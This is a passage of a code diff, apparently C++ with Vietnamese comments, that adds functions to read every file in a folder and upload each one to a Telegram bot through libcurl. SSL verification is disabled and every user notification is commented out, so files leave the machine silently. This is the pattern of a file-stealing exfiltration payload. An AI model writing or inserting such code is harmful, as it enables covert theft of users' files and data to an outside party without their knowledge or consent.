+    CURLcode res;
+    std::ifstream file(filePath, std::ios::binary);
+    if (!file.is_open()) {
+    //    CanhBao("Không thể mở file: " + filePath, 4000);
+        return false;
+    }
+
+    std::string file_content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
+
+    curl_global_init(CURL_GLOBAL_ALL);
+    curl = curl_easy_init();
+
+    if (curl) {
+        std::string url = "https://api.telegram.org/bot" + botToken + "/sendDocument";
+        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+        std::string body;
+
+        // Thêm trường chat_id
+        body += "--" + boundary + "\r\n";
+        body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
+        body += chatId + "\r\n";
+
+        // Thêm trường file (document)
+        body += "--" + boundary + "\r\n";
+        body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + filePath + "\"\r\n";
+        body += "Content-Type: application/octet-stream\r\n\r\n";
+        body += file_content + "\r\n";
+        body += "--" + boundary + "--\r\n";
+
+        struct curl_slist* headers = nullptr;
+        headers = curl_slist_append(headers, ("Content-Type: multipart/form-data; boundary=" + boundary).c_str());
+
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+
+        res = curl_easy_perform(curl);
+
+        curl_slist_free_all(headers);
+        curl_easy_cleanup(curl);
+    }
+
+    curl_global_cleanup();
+    if (res == CURLE_OK) {
+    //    ThanhCong("Đã gửi file: " + filePath, 4000);
+    } else {
+  //      Loi("Lỗi khi gửi file: " + filePath, 4000);
+    }
+    return (res == CURLE_OK);
+}
+
+void sendAllFilesInFolder(const std::string& folderPath) {
+    DIR* dir = opendir(folderPath.c_str());
+    if (!dir) {
+   //     Loi("Không thể mở thư mục: " + folderPath, 4000);
+        return;
+    }
+
+    struct dirent* entry;
+    while ((entry = readdir(dir)) != nullptr) {
+        // Bỏ qua "." và ".."
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+            continue;
+        }
+
+        // Tạo đường dẫn đầy đủ
+        std::string filePath = folderPath + "/" + entry->d_name;
+
+        // Gửi file
+        if (sendFile(filePath)) {
+      //      ThanhCong("Đã gửi file: " + filePath, 4000);
+        } else {
+         //   Loi("Lỗi khi gửi file: " + filePath, 4000);
+        }
+    }
+
+    closedir(dir);
+   // ThanhCong("Hoàn tất gửi tất cả file trong thư mục: " + folderPath, 4000);
+}
+
+
